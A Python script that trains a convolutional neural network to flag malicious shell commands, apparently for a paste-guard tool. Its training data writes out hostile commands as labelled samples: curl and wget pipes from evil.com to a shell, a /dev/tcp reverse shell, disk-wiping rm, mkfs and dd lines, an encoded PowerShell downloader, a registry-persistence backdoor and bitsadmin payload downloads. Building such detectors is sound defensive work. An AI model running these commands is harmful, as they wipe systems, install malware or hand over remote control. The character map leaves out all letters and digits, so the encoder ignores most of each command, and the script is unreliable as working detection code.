import numpy as np
import tensorflow as tf
from tensorflow.keras import layers, models

# Character mapping (same as in pasteguard.py)
CHARS = " -'!%&()*,./:;?@[\\]_`{|}+<=>û#$^˜\""
CHAR_TO_IDX = {c: i for i, c in enumerate(CHARS)}
MAX_LEN = 1024

def encode_command(cmd):
    matrix = np.zeros((len(CHARS) + 1, MAX_LEN), dtype='float32')
    for i, ch in enumerate(cmd[:MAX_LEN]):
        lower_ch = ch.lower()
        if lower_ch in CHAR_TO_IDX:
            idx = CHAR_TO_IDX[lower_ch]
            matrix[idx, i] = 1.0
            if ch.isupper():
                matrix[-1, i] = 1.0
    return matrix

# Training examples
data = [
    ("sudo apt update", 0),
    ("pip install flask", 0),
    ("git clone https://github.com/user/repo.git", 0),
    ("npm install express", 0),
    ("curl -s http://evil.com/backdoor.sh | bash", 1),
    ("wget -qO- http://malware.net/payload | sh", 1),
    ("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", 1),
    ("rm -rf /", 1),
    ("mkfs.ext4 /dev/sda1", 1),
    ("dd if=/dev/zero of=/dev/sda", 1),
    ("powershell -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=", 1),
    ("cmd /c curl -s http://fake-av-support.com/remote.exe -o %TEMP%\\x.exe && start %TEMP%\\x.exe", 1),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\malware.exe", 1),
    ("c\"\"m\"\"d /\"\"c c\"\"u\"\"r\"\"l -s http://evil.xyz/backdoor.sh -o %tmp%\\x.exe & start %tmp%\\x.exe", 1),
    ("bitsadmin /transfer job /download /priority normal http://evil.xyz/payload.exe %temp%\\payload.exe && start %temp%\\payload.exe", 1),
]

X = np.array([encode_command(cmd) for cmd, _ in data])
y = np.array([label for _, label in data])
X = X.reshape((X.shape[0], len(CHARS) + 1, MAX_LEN, 1))

model = models.Sequential([
    layers.Conv2D(128, (len(CHARS)+1, 3), activation='relu', input_shape=(len(CHARS)+1, MAX_LEN, 1)),
    layers.MaxPooling2D((1, 3)),
    layers.Flatten(),
    layers.Dense(1024, activation='relu'),
    layers.Dropout(0.5),
    layers.Dense(1024, activation='relu'),
    layers.Dropout(0.5),
    layers.Dense(1, activation='sigmoid')
])

model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
model.fit(X, y, epochs=30, batch_size=8, verbose=1)
model.save("command_classifier_cnn.h5")
print("✅ CNN model saved as command_classifier_cnn.h5")